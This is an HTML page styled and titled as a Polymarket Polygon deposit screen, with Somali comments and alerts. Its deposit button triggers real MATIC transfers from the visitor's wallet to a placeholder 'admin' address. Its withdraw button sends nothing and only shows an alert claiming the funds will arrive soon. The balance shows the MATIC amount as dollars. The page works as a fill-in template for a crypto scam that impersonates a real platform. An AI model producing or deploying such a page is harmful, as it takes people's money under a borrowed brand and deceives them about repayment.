<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Polymarket Real Polygon Deposit</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <!-- Ethers.js CDN for Real Blockchain Transactions -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
    </style>
</head>
<body class="bg-[#0F1117] text-white flex justify-center items-center min-h-screen font-sans antialiased">

    <!-- Mobile Viewport Container -->
    <div class="w-full max-w-[420px] h-screen sm:h-[840px] bg-[#0F1117] flex flex-col relative overflow-hidden sm:rounded-[16px] border border-[#1E2230]">

        <!-- HEADER -->
        <header class="h-[56px] bg-[#0F1117] px-4 border-b border-[#1E2230] flex justify-between items-center shrink-0 z-10">
            <div class="flex items-center gap-2">
                <div class="w-7 h-7 rounded-lg bg-[#2F66F6] flex items-center justify-center">
                    <svg class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
                    </svg>
                </div>
                <span class="font-extrabold text-lg text-white tracking-tight">Polymarket</span>
            </div>
            
            <div class="flex items-center gap-3">
                <button onclick="connectWallet()" id="connectWalletBtn" class="px-3 py-1.5 rounded-lg bg-[#2F66F6] text-white text-xs font-bold hover:bg-blue-600 transition">
                    Connect Wallet
                </button>
            </div>
        </header>

        <!-- MAIN BODY -->
        <main class="flex-1 overflow-y-auto no-scrollbar p-4 space-y-4">
            
            <!-- PORTFOLIO BALANCE -->
            <div class="flex justify-between items-baseline bg-[#1B1E2B] p-4 rounded-[16px] border border-[#1E2230]">
                <div>
                    <div class="text-xs text-[#9CA3AF] font-medium mb-0.5">Polygon Balance</div>
                    <div id="walletBalance" class="text-3xl font-bold text-[#FFFFFF]">$0.00</div>
                </div>
                <div class="text-right">
                    <div class="text-xs text-[#9CA3AF] font-medium mb-0.5">Network</div>
                    <div id="networkName" class="text-xs font-bold text-emerald-400">Not Connected</div>
                </div>
            </div>

            <!-- ACTION BUTTONS -->
            <div class="grid grid-cols-2 gap-3">
                <button onclick="openDepositModal()" class="h-[50px] rounded-[8px] bg-[#2F66F6] text-[#FFFFFF] font-bold text-sm flex items-center justify-center gap-2 hover:bg-blue-600 transition">
                    <i data-lucide="arrow-down-left" class="w-4 h-4 stroke-[2.5]"></i>
                    <span>Deposit</span>
                </button>
                <button onclick="openWithdrawModal()" class="h-[50px] rounded-[8px] bg-[#1E2230] text-[#FFFFFF] font-bold text-sm flex items-center justify-center gap-2 border border-[#1E2230] hover:bg-slate-800 transition">
                    <i data-lucide="arrow-up-right" class="w-4 h-4 text-[#9CA3AF] stroke-[2.5]"></i>
                    <span>Withdraw</span>
                </button>
            </div>

        </main>

        <!-- REAL DEPOSIT MODAL -->
        <div id="depositModal" class="fixed inset-0 bg-black/80 hidden flex items-center justify-center p-4 z-50">
            <div class="bg-[#1B1E2B] w-full max-w-[340px] rounded-2xl p-5 border border-[#1E2230] space-y-4">
                <div class="flex justify-between items-center">
                    <h3 class="font-bold text-sm text-white">Real Deposit (Polygon)</h3>
                    <button onclick="closeDepositModal()" class="text-[#9CA3AF] hover:text-white"><i data-lucide="x" class="w-5 h-5"></i></button>
                </div>
                <div>
                    <label class="text-xs text-[#9CA3AF]">Xadka ugu yar: $0.10 (MATIC)</label>
                    <input type="number" id="depositAmount" min="0.1" step="0.01" value="0.10" class="w-full mt-1 bg-[#0F1117] border border-[#1E2230] rounded-lg p-2.5 text-sm text-white focus:outline-none focus:border-[#2F66F6]">
                </div>
                <button onclick="executeRealDeposit()" class="w-full h-11 bg-[#2F66F6] text-white font-bold rounded-lg text-sm hover:bg-blue-600">
                    Bixi $0.10 (MetaMask)
                </button>
            </div>
        </div>

        <!-- WITHDRAW MODAL -->
        <div id="withdrawModal" class="fixed inset-0 bg-black/80 hidden flex items-center justify-center p-4 z-50">
            <div class="bg-[#1B1E2B] w-full max-w-[340px] rounded-2xl p-5 border border-[#1E2230] space-y-4">
                <div class="flex justify-between items-center">
                    <h3 class="font-bold text-sm text-white">Withdraw (Polygon)</h3>
                    <button onclick="closeWithdrawModal()" class="text-[#9CA3AF] hover:text-white"><i data-lucide="x" class="w-5 h-5"></i></button>
                </div>
                <div class="space-y-3">
                    <div>
                        <label class="text-xs text-[#9CA3AF]">Meeqa ($)? Ugu yar $0.10</label>
                        <input type="number" id="withdrawAmount" min="0.1" step="0.01" value="0.10" class="w-full mt-1 bg-[#0F1117] border border-[#1E2230] rounded-lg p-2.5 text-sm text-white focus:outline-none focus:border-[#2F66F6]">
                    </div>
                    <div>
                        <label class="text-xs text-[#9CA3AF]">Cinwaankaaga (Polygon Wallet Address)</label>
                        <input type="text" id="userWalletAddressInput" placeholder="0x..." class="w-full mt-1 bg-[#0F1117] border border-[#1E2230] rounded-lg p-2.5 text-xs font-mono text-white placeholder-gray-600 focus:outline-none focus:border-[#2F66F6]">
                    </div>
                </div>
                <button onclick="executeWithdraw()" class="w-full h-11 bg-[#2F66F6] text-white font-bold rounded-lg text-sm hover:bg-blue-600">
                    Dalbo Withdraw
                </button>
            </div>
        </div>

    </div>

    <script>
        lucide.createIcons();

        let provider;
        let signer;
        let userAddress;

        // 1. Isku xidhka Wallet-ka
        async function connectWallet() {
            if (window.ethereum) {
                try {
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    signer = provider.getSigner();
                    userAddress = await signer.getAddress();
                    
                    // Hubi inuu ku jiro Polygon Network (Chain ID: 137)
                    const network = await provider.getNetwork();
                    if (network.chainId !== 137) {
                        alert("Fadlan u beddel shabakaddaada Polygon Mainnet (Chain ID: 137)");
                        await switchToPolygon();
                        return;
                    }

                    document.getElementById('connectWalletBtn').innerText = userAddress.substring(0, 6) + '...' + userAddress.substring(38);
                    document.getElementById('networkName').innerText = "Polygon Mainnet";
                    updateBalance();
                } catch (error) {
                    console.error(error);
                    alert("Cilad ayaa dhacday markii la xidhinayay wallet-ka.");
                }
            } else {
                alert("Fadlan ku rakib MetaMask ama TrustWallet browser-kaaga!");
            }
        }

        async function switchToPolygon() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x89' }], // 137 in Hex
                });
                connectWallet();
            } catch (switchError) {
                alert("Lama bedeli karo shabakadda. Fadlan gacanta ugu beddel Polygon Mainnet.");
            }
        }

        function openDepositModal() { document.getElementById('depositModal').classList.remove('hidden'); }
        function closeDepositModal() { document.getElementById('depositModal').classList.add('hidden'); }
        function openWithdrawModal() { document.getElementById('withdrawModal').classList.remove('hidden'); }
        function closeWithdrawModal() { document.getElementById('withdrawModal').classList.add('hidden'); }

        // 2. Real Deposit (Ugu yar $0.10 oo si toos ah uga baxaya boorsadaada)
        async function executeRealDeposit() {
            const amountInput = document.getElementById('depositAmount').value;
            const amount = parseFloat(amountInput);

            if (amount < 0.1) {
                alert("Lacagta deposit-ka ah ee ugu yar waa $0.10!");
                return;
            }

            if (!signer) {
                alert("Fadlan marka hore ku xidh boorsadaada (Connect Wallet)");
                return;
            }

            try {
                // HALKAN GELI CINWAANKAADU K ADHEESHAY (Admin / Treasury Address)
                const recipientAddress = "0xYourAdminWalletAddressHere"; 

                // Qiimaha oo loo beddelayo Wei (MATIC) - Halkan waxaa lagu qiyaasay in MATIC ay joogto qiimo go'an ama waxaa loo diri karaa Native Token
                // Si fudud ayaan ugu diraynaa qiimaha MATIC oo waafaqsan $0.10 (Tusaale: qiyaastii 0.15 MATIC ama waxaa lagu xidhi karaa API qiimaha)
                const tx = await signer.sendTransaction({
                    to: recipientAddress,
                    value: ethers.utils.parseEther((amount / 0.65).toFixed(4).toString()) // Tusaale ahaan beddelka MATIC
                });

                alert("Dalabkaaga deposit-ka waa la diray. Sug inta ay shabakaddu xaqiijinayso...");
                await tx.wait();
                alert("Guul! Deposit-kii dhabta ahaa waa la xaqiijiyay.");
                closeDepositModal();
                updateBalance();
            } catch (error) {
                console.error(error);
                alert("Wuu guuldarraystay deposit-kii ama waa la joojiyay.");
            }
        }

        function executeWithdraw() {
            const amount = parseFloat(document.getElementById('withdrawAmount').value);
            const address = document.getElementById('userWalletAddressInput').value;

            if (amount < 0.1) {
                alert("Lacagta ugu yar ee la bixi karo waa $0.10!");
                return;
            }

            if (!address || !address.startsWith('0x')) {
                alert("Fadlan geli cinwaan sax ah oo Polygon ah (0x...)!");
                return;
            }

            alert(`Dalabkaaga withdraw ee $${amount} waxaa loo diray cinwaanka: ${address}. Dhawaan ayaa laguugu soo shubi doonaa.`);
            closeWithdrawModal();
        }

        async function updateBalance() {
            if (signer) {
                const balance = await provider.getBalance(userAddress);
                document.getElementById('walletBalance').innerText = '$' + parseFloat(ethers.utils.formatEther(balance)).toFixed(2);
            }
        }
    </script>
</body>
</html>
